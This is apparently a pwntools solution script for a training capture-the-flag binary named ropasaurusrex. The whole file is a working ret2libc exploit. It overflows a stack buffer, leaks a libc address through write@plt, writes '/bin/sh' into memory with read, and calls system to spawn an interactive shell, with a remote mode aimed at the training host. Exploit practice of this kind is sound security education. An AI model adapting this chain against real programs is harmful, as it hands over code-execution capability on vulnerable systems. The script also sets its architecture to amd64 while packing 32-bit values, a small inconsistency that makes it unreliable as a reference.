from pwn import *

LIBC_PATH = "./downloads/libc-2.39.so"
LIBC = ELF(LIBC_PATH)
CHALL_PATH = "./ropasaurusrex_patched"
CHALL = ELF(CHALL_PATH)
COMMANDS = """
b *0x80491AE
c
"""

context.arch = "amd64"

if args.REMOTE:
    c = remote("ropasaurusrex.training.offensivedefensive.it",8080,ssl=True)
else:
    if args.GDB:
        c = gdb.debug(CHALL_PATH, COMMANDS)
    else:
        c = process(CHALL_PATH)

## Find sEIP 
# cyclic_payload = cyclic(300)
# print(cyclic_payload)
# c.recvuntil(b"Input: ")
# c.sendline(cyclic_payload)

## Get Leak to calculate libc base address

payload = b"A" * 268                      # reach sEIP
payload += p32(CHALL.plt["write"])        # call write using plt
payload += p32(CHALL.symbols["main"])     # restart the program after leak
payload += p32(1)                         # write on stdoutput
payload += p32(CHALL.got["read"])         # write the content of the goat pointer of the read
payload += p32(4)                         # write 4 byte (address, 32 bit arch)

c.recvuntil(b"Input: ")
c.sendline(payload)

libc_leak = u32(c.recv(4))
LIBC.address = libc_leak - LIBC.symbols["read"] # calculate base address of libc


## Insert in memory the string /bin/sh using read function

payload = b"A" * 268                          # reach sEIP
payload += p32(LIBC.symbols["read"])          # call read
payload += p32(CHALL.symbols["main"])         # restart the program after write the string
payload += p32(0)                             # read from stdin
payload += p32(0x804c070)                     # memory zone to write the string
payload += p32(7)                             # read 7 byte /bin/sh

c.recvuntil(b"Input: ")
c.sendline(payload)
c.send(b"/bin/sh")

## Finally call system with /bin/sh as argument

payload = b"A" * 268                          # reach sEIP
payload += p32(LIBC.symbols["system"])        # call system
payload += p32(0xdeadbeef)                               
payload += p32(0x804c070)                     # memory zone where is stored /bin/sh

c.recvuntil(b"Input: ")
c.sendline(payload)



c.interactive()

